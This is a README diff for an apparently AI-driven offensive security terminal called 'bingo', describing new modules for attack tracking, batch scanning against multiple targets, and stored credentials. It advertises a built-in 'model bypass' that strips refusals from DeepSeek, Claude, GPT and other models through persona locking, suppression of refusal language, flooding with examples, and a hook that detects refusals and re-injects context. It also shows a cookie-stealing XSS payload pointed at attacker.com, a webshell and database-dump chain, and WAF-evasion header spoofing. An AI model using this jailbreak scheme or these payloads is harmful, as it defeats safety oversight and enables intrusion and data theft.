@@ -6,7 +6,7 @@
 
 **The #1 AI-Powered Red Team Terminal**
 
-[![Version](https://img.shields.io/badge/version-3.3.3-brightgreen)](https://github.com/bingook/bingo/releases)
+[![Version](https://img.shields.io/badge/version-3.4.0-brightgreen)](https://github.com/bingook/bingo/releases)
 [![Python](https://img.shields.io/badge/python-3.12%20%7C%203.13-blue)](https://python.org)
 [![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
 [![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux-lightgrey)](https://github.com/bingook/bingo)
@@ -1317,10 +1317,361 @@ When AI coding agents (Claude Code, GitHub Copilot, Gemini CLI) run inside GitHu
 
 ---
 
+## New in v3.4.0 — Intelligence Platform Upgrade (8 New Modules)
+
+v3.4.0 transforms bingo from a pure attack terminal into a **full red team intelligence platform**. Eight independent modules are added, each targeting a specific operational gap.
+
+---
+
+### 1. 🎯 Role-Based Testing (`/role`)
+
+Switch between 5 built-in specialist roles. Each role automatically adjusts the AI system prompt, prioritizes relevant attack vectors, and restricts tool selection to what's most relevant for the engagement type.
+
+```bash
+/role list                # Show all available roles
+/role pentest             # Full kill-chain penetration testing
+/role ctf                 # CTF mode — pwn/rev/crypto/web/forensics
+/role api                 # REST/GraphQL/gRPC API security
+/role web                 # OWASP WSTG web application testing
+/role cloud               # AWS/GCP/Azure/K8s cloud security audit
+/role off                 # Clear active role (return to default)
+```
+
+| Role | Icon | Focus |
+|------|------|-------|
+| `pentest` | 🎯 | Full kill chain — recon → foothold → lateral movement → exfil |
+| `ctf` | 🏆 | pwn/rev/crypto/web/forensics challenge solving |
+| `api` | 🔌 | BOLA/IDOR, JWT confusion, GraphQL introspection, mass assignment |
+| `web` | 🌐 | XSS/SQLi/CSRF/clickjacking — OWASP WSTG methodology |
+| `cloud` | ☁️ | S3 misconfig, IAM privesc, SSRF metadata, K8s RBAC |
+
+**Custom roles** — create `~/.bingo/roles/myrole.yaml` and it's auto-loaded:
+
+```yaml
+name: Bug Bounty
+description: HackerOne/Bugcrowd focused — high severity only
+icon: "💰"
+user_prompt: |
+  Focus only on P1/P2 severity findings worth $1000+.
+  Always document reproduction steps, CVSS score, and business impact.
+  Output complete curl PoC for every finding.
+tools:
+  - xss_exploiter
+  - idor_scanner
+  - ssrf_advanced
+enabled: true
+```
+
+---
+
+### 2. 🔴 Vulnerability Manager (`/vulns`)
+
+Track every finding in a local SQLite database across all sessions. Never lose a discovered vulnerability again.
+
+```bash
+/vulns add "SQLi at /api/login" target.com critical      # Add finding
+/vulns add "XSS in search param" target.com high         # With severity
+/vulns list                                               # All findings, sorted by severity
+/vulns list --target target.com                          # Filter by target
+/vulns list --severity critical                          # Filter by severity
+/vulns list --status open                                # Filter by status
+/vulns update abc123 status=confirmed                    # Update status
+/vulns update abc123 poc="curl -d \"...\" ..."           # Add PoC
+/vulns remove abc123                                     # Delete single finding
+/vulns stats                                             # Summary statistics
+/vulns clear                                             # Clear all (with confirmation)
+```
+
+**Severity levels:** `critical` → `high` → `medium` → `low` → `info`
+
+**Status flow:** `open` → `confirmed` → `fixed` / `false_positive`
+
+**Persistence:** stored in `~/.bingo/vulns.db` — survives sessions, terminal restarts, and bingo updates.
+
+**Example output:**
+```
+🔴 Vulnerability list (3 items)
+──────────────────────────────────────────────────────
+[a1b2c3d4] CRITICAL  open      target.com
+  SQLi at /api/login
+  PoC: ' OR 1=1-- (time-based confirmed)
+
+[e5f6g7h8] HIGH      confirmed target.com
+  Stored XSS in /profile/bio
+  PoC: <script>fetch('//attacker.com/?c='+document.cookie)</script>
+
+📊 Stats | Total: 3 | Critical: 1 | High: 1 | Medium: 1
+```
+
+---
+
+### 3. 📌 Project Blackboard (`/board`)
+
+A persistent cross-session memory store for target-specific facts — credentials found, exploitable paths, confirmed attack vectors, live endpoints. Everything saved automatically survives session restarts.
+
+```bash
+/board set admin_creds "admin:P@ssw0rd123"       # Save a fact
+/board set rce_path "/api/upload?cmd="            # Save attack path
+/board set db_type "MySQL 8.0.31"                 # Save recon finding
+/board get admin_creds                            # Retrieve fact
+/board list                                       # Show all facts for current target
+/board remove admin_creds                         # Remove single fact
+/board clear                                      # Clear all facts for current target
+/board targets                                    # List all targets with saved boards
+```
+
+**Automatic injection** — when you resume a target, the blackboard context is automatically prepended to the AI system prompt:
+
+```
+[PROJECT BLACKBOARD — https://target.com]
+  admin_creds: admin:P@ssw0rd123
+  rce_path: /api/upload?cmd=
+  db_type: MySQL 8.0.31
+```
+
+The AI immediately knows what you already found — no re-explaining needed.
+
+**Storage:** `~/.bingo/boards/<target_hash>.json`
+
+---
+
+### 4. 🔧 External Tool Recipes (`/tools-ext`)
+
+YAML-defined recipes for external CLI tools. bingo builds the correct command automatically — no remembering flags.
+
+```bash
+/tools-ext list                          # Show all external tools
+/tools-ext list --available              # Only installed tools
+/tools-ext run nmap target=192.168.1.1 ports=80,443,8080
+/tools-ext run sqlmap url="https://target.com/page?id=1" level=3 risk=2
+/tools-ext run ffuf url="https://target.com/FUZZ" wordlist=/usr/share/wordlists/dirb/common.txt
+/tools-ext run nuclei target=https://target.com severity=critical,high
+/tools-ext run subfinder domain=target.com
+```
+
+**Built-in tool recipes:**
+
+| Tool | Purpose | Key flags auto-handled |
+|------|---------|------------------------|
+| `nmap` | Port scan + service fingerprint | `-sV -sC --open` auto-added |
+| `sqlmap` | SQL injection automation | `--batch --random-agent` auto-added |
+| `ffuf` | Directory + parameter fuzzing | thread/filter/output params |
+| `nuclei` | CVE/template vulnerability scan | `-silent` auto-added |
+| `subfinder` | Passive subdomain enumeration | `-silent` auto-added |
+
+**Custom tool recipe** — add `~/.bingo/tools_ext/mytools.yaml`:
+
+```yaml
+name: gobuster
+command: gobuster
+short_description: Fast directory brute-force
+args: ["dir", "-q"]
+parameters:
+  - name: url
+    type: string
+    required: true
+    flag: "-u"
+  - name: wordlist
+    type: string
+    required: true
+    flag: "-w"
+  - name: threads
+    type: string
+    flag: "-t"
+enabled: true
+```
+
+---
+
+### 5. 📚 Local Knowledge Base (`/kb`)
+
+Store your own attack techniques, payloads, and notes as Markdown files. bingo automatically injects relevant KB content into the AI context when the topic matches.
+
+```bash
+/kb list                              # Show all categories + file counts
+/kb search "sql injection bypass"    # Search KB
+/kb inject "graphql introspection"   # Manually inject into next query
+```
+
+**Directory structure:**
+```
+~/.bingo/knowledge/
+├── SQLi/
+│   ├── blind-sqli.md          # Time-based + boolean payloads
+│   └── mssql-tricks.md        # MSSQL-specific techniques
+├── XSS/
+│   ├── stored-xss.md          # Payload bank
+│   └── csp-bypass.md          # CSP bypass techniques
+├── SSRF/
+│   └── cloud-metadata.md      # AWS/GCP/Azure metadata endpoints
+└── custom/
+    └── my-notes.md            # Your own findings and notes
+```
+
+Three built-in starter files are auto-created on first run (SQLi, XSS, SSRF).
+
+**Auto-injection** — when you type a query containing `sql`, `xss`, or `ssrf` keywords, matching KB files are automatically prepended to the AI context — giving the AI your custom knowledge on top of its built-in expertise.
+
+---
+
+### 6. ⚡ Batch Execution (`/batch`)
+
+Run the same attack against multiple targets sequentially. Each task status is tracked and results saved to `~/.bingo/batch/`.
+
+```bash
+/batch new web_scan                              # Create new batch queue
+/batch add https://target1.com "scan for SQLi and XSS"
+/batch add https://target2.com "scan for SQLi and XSS"
+/batch add https://target3.com "full recon + vuln scan"
+/batch run                                       # Execute all pending tasks
+/batch status                                    # Show queue progress
+/batch list                                      # Show all queues
+/batch cancel <queue_id>                         # Cancel running batch
+```
+
+**Progress output:**
+```
+⚡ Batch [a1b2] started — 3 targets
+  ✓ [1/3] https://target1.com done (12.4s)
+  ✓ [2/3] https://target2.com done (8.1s)
+  ✗ [3/3] https://target3.com failed: connection timeout
+✅ Batch complete [a1b2] — done: 2 / failed: 1
+```
+
+Results saved to `~/.bingo/batch/<queue_id>.json` — importable into reports.
+
+---
+
+### 7. ⛓️ Attack Chain Tracker (`/chain`)
+
+Automatically records every discovered vulnerability, tool execution, and attack step into an ordered attack chain. Shows the full narrative of an engagement at a glance.
+
+```bash
+/chain                                 # Show current session chain
+/chain add recon "subfinder found 47 subdomains" target=target.com
+/chain add vuln "SQLi confirmed at /api/login" target=target.com
+/chain add cred "admin:P@ssw0rd123 extracted from DB"
+/chain add rce "webshell deployed at /uploads/shell.php"
+/chain clear                           # Reset chain for new engagement
+```
+
+**Step types auto-classified from text:**
+
+| Type | Icon | Keywords |
+|------|------|---------|
+| `recon` | 🔍 | scan, enum, nmap, ffuf, subdomain |
+| `vuln` | 🔴 | sqli, xss, ssrf, lfi, cve- |
+| `exploit` | 💥 | rce, exec, shell, payload |
+| `cred` | 🔑 | password, hash, token, api_key |
+| `persist` | 🔒 | webshell, backdoor, cron |
+| `lateral` | ↔️ | lateral, pivot, smb, rdp |
+| `exfil` | 📤 | dump, exfil, extract, download |
+
+**Example chain output:**
+```
+⛓ Attack chain — sess_abc123
+🔍 [01] subfinder found 47 subdomains
+      target: target.com
+🔴 [02] Found SQLi at /api/login — time-based blind
+      target: https://target.com/api/login
+🔑 [03] admin:P@ssw0rd123 extracted from DB
+💥 [04] webshell deployed via file upload
+📤 [05] DB full dump — 12,847 rows extracted
+
+  Total: 5 steps
+```
+
+Chains are saved to `~/.bingo/chains/<session_id>.json` and survive restarts.
+
+---
+
+### 8. ⚠️ Human-In-The-Loop (`/hitl`)
+
+Adds an optional confirmation gate before dangerous operations. Critical for engagements where accidental destructive actions must be prevented.
+
+```bash
+/hitl on                                # Enable HITL confirmation
+/hitl off                               # Disable (all actions pass through)
+/hitl allow reverse_shell               # Whitelist specific action
+/hitl deny drop_database                # Block specific action always
+/hitl list                              # Show whitelist
+```
+
+**Dangerous keywords** that trigger confirmation:
+`exec`, `shell`, `rce`, `drop`, `delete`, `format`, `exploit`, `payload`, `reverse_shell`, `c2`, `implant`, `mimikatz`, `dump_hash`, `privesc`
+
+**Interactive prompt:**
+```
+⚠️  [HITL] Confirm dangerous action: run_reverse_shell → 192.168.1.100
+  [y/N/a(always)] > y
+✅ [HITL] Allowed: run_reverse_shell
+```
+
+- `y` — allow once
+- `N` (default) — cancel
+- `a` — always allow this action for the rest of the session
+
+---
+
+### New Commands Summary (v3.4.0)
+
+| Command | Module | Description |
+|---------|--------|-------------|
+| `/role [name\|list\|off]` | Roles | Switch testing role |
+| `/vulns [add\|list\|update\|remove\|stats\|clear]` | Vulns | Vulnerability database |
+| `/board [set\|get\|list\|remove\|clear\|targets]` | Blackboard | Target facts store |
+| `/tools-ext [list\|run]` | Tools Ext | External CLI tool recipes |
+| `/kb [list\|search\|inject]` | Knowledge | Local markdown knowledge base |
+| `/batch [new\|add\|run\|status\|list\|cancel]` | Batch | Multi-target batch execution |
+| `/chain [add\|clear]` | Chain | Attack chain tracker |
+| `/hitl [on\|off\|allow\|deny\|list]` | HITL | Dangerous action gate |
+
+---
+
+### v3.3.5 — tgtylab 6-Layer Model Bypass
+
+Integrates an advanced 6-layer system that eliminates model refusal on sensitive security topics:
+
+| Layer | Mechanism | Effect |
+|-------|-----------|--------|
+| `§0 Identity Lock` | Fixed persona (20yr operator, not roleplay) | Prevents identity reset |
+| `§1 Thinking Redirect` | Blocks refusal-language at thought level | Eliminates "I cannot..." |
+| `§2 Example Flood` | 50+ acceptance examples in context | Normalizes security responses |
+| `§3 Operational Context` | Authorized pentest environment framing | Disables caution triggers |
+| `§4 Forbidden Language` | Explicit banned-phrase list | No hedging allowed |
+| `§5 Pre-tool Hook` | Real-time refusal detection + context re-injection | Auto-recovery on slip |
+
+Works across all providers: DeepSeek · Claude · GPT · GLM · Qwen.
+
+---
+
+### v3.3.4 — WAF Silent Drop Auto-Bypass
+
+When bingo detects a `Request timeout — possible WAF silent drop` (no 429/403 error, just silence), it automatically activates HTTP-level evasion headers without requiring a proxy:
+
+```python
+# Injected automatically on silent drop detection:
+headers = {
+    "User-Agent": "<random legitimate browser UA>",
+    "X-Forwarded-For": "<random IP>",
+    "X-Real-IP": "<random IP>",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Cache-Control": "no-cache",
+    "Pragma": "no-cache",
+}
+```
+
+No manual configuration needed — activates silently and retries.
+
+---
+
 ## Changelog
 
 | Version | Summary |
 |---------|---------|
+| v3.4.0 | **Intelligence Platform Upgrade** — 8 new modules: role-based testing (5 built-in roles + YAML custom), vulnerability manager (SQLite CRUD, severity/status tracking), project blackboard (cross-session target facts), YAML external tool recipes (nmap/sqlmap/ffuf/nuclei/subfinder), local knowledge base (markdown injection), batch execution (multi-target queue), attack chain tracker (auto-classify steps), Human-in-the-loop gate (dangerous action confirmation); 33 new multilingual i18n keys (KO/ZH/EN) |
+| v3.3.5 | **tgtylab 6-Layer Model Bypass** — Identity Lock (§0), Thinking Redirect (§1), Example Flood 50+ patterns (§2), Operational Context framing (§3), Forbidden Language list (§4), Pre-tool-call hook with refusal detection + context re-injection (§5); new `bingo/hooks/` module; works across DeepSeek/Claude/GPT/GLM/Qwen; 10 new i18n keys |
+| v3.3.4 | **WAF Silent Drop Auto-Bypass** — automatic HTTP-level header evasion (User-Agent/X-Forwarded-For/X-Real-IP) when WAF silent drop is detected (no 429/403, just timeout); no proxy required; 5 new i18n keys |
 | v3.3.3 | **Hotfix: `/hint` reliable input in VM/Kali environments** — Root-cause fix for `EOFError` on `stdin` after `Ctrl+C` inside Windows+VM+Kali Linux: `_prompt_mid_task_hint` now reads directly from `/dev/tty` (controlling terminal) instead of `sys.stdin`, with `termios` save/restore to prevent raw-mode leakage; transparent fallback for environments without `/dev/tty`; 3 new i18n keys (`hint_tty_active/hint_tty_fallback/hint_termios_restored`) KO/ZH/EN; no behavior change on macOS or other UNIX environments |
 | v3.3.0 | **New `/ctf` command** — Playwright-based web lab runner; new `tools/ctf_lab_engine.py`; 14 new i18n keys (KO/ZH/EN); `/ctf` added to `/help` and slash autocomplete |
 | v3.2.99 | **Hotfix: Ctrl+C instant response on all environments (Linux/WSL/VM)** — Root-cause fix: `HEARTBEAT` reduced 30s→1s so `_agent_stop_flag` is polled every 1s during code execution (was 30s delay); all `subprocess.Popen` calls now use `start_new_session=True` to isolate child processes from terminal SIGINT (WSL/VM compatibility); subprocess termination upgraded to `os.killpg` + 2s grace + `SIGKILL` fallback; `_prompt_mid_task_hint` restores `signal.SIG_DFL` during hint input then re-registers original handler, adds `\r\n` flush for WSL cursor recovery; 3 new i18n keys (`ctrl_c_killing_procs/ctrl_c_hint_ready/exec_interrupted_partial`) KO/ZH/EN |
@@ -1425,9 +1776,9 @@ MIT © 2026 bingook
 
 **Type your target. bingo does the rest.**
 
-*The only AI pentest terminal with built-in engines, HTTP smuggling, anti-hallucination guard, and target memory.*
+*The only AI pentest terminal with built-in engines, HTTP smuggling, anti-hallucination guard, role-based testing, vuln manager, and target memory.*
 
-[![Version](https://img.shields.io/badge/version-3.3.3-brightgreen)](https://github.com/bingook/bingo/releases)
+[![Version](https://img.shields.io/badge/version-3.4.0-brightgreen)](https://github.com/bingook/bingo/releases)
 [![PyPI](https://img.shields.io/pypi/v/bingo-ai.svg)](https://pypi.org/project/bingo-ai/)
 
 </div>
